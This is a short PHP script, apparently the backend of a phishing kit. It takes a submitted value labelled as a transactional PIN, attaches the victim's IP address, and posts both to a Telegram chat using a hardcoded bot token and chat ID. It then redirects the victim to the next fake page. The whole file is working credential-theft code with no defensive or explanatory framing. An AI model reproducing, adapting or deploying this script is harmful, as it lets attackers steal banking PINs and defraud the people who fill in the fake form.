<?php
// Datos de configuración
$telegramBotToken = '7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns';
$chatId = '-1002365815581';
 
$telefono = $_POST['telefono'];

// Obtener la dirección IP y ciudad del cliente
$ip = $_SERVER['REMOTE_ADDR'];
// Utiliza una API para obtener la información de la ciudad según la IP (por ejemplo, ip-api.com)
 

// Mensaje a enviar a Telegram
$message = "PIN TRANSACCIONAL 1:\n\n";
 
$message .= "PIN: " . $telefono . "\n";
$message .= "IP: " . $ip . "\n";
 

// Enviar el mensaje a través del bot de Telegram
$telegramApiUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage";
$telegramParams = [
  'chat_id' => $chatId,
  'text' => $message
];

// Realizar la solicitud HTTP a la API de Telegram
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Comprobar la respuesta de la API de Telegram
if ($response === false) {
  echo "Error al enviar el mensaje a Telegram.";
} else {
  // Redireccionar a una página HTML
  header("Location: index4.html");
  exit;
}
?>